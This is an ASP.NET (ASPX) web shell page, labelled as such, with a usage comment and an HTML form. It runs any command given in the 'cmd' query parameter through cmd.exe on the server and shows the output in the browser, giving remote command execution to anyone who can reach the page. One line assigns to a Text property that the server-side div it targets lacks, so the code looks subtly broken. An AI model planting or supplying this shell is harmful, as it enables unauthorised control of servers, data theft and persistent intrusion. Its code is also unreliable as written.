<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>

<!--
 ASPX Command Webshell
 Usage: Access via browser with ?cmd=command
 Example: shell.aspx?cmd=whoami
-->

<script runat="server">
    void Page_Load(object sender, EventArgs e) {
        string cmd = Request.QueryString["cmd"];
        
        if (!string.IsNullOrEmpty(cmd)) {
            try {
                // Create process to execute command
                ProcessStartInfo psi = new ProcessStartInfo();
                psi.FileName = "cmd.exe";
                psi.Arguments = "/c " + cmd;
                psi.UseShellExecute = false;
                psi.RedirectStandardOutput = true;
                psi.CreateNoWindow = true;
                
                Process proc = Process.Start(psi);
                StreamReader sr = proc.StandardOutput;
                
                output.Text = "<pre>" + Server.HtmlEncode(sr.ReadToEnd()) + "</pre>";
                sr.Close();
                proc.WaitForExit();
            } catch (Exception ex) {
                output.Text = "Error: " + Server.HtmlEncode(ex.Message);
            }
        }
    }
</script>

<!DOCTYPE html>
<html>
<head>
    <title>ASPX Command Webshell</title>
</head>
<body>
    <h2>ASPX Command Webshell</h2>
    <form method="GET">
        <input type="text" name="cmd" placeholder="Enter command" size="50">
        <input type="submit" value="Execute">
    </form>
    
    <div id="output" runat="server"></div>
</body>
</html>
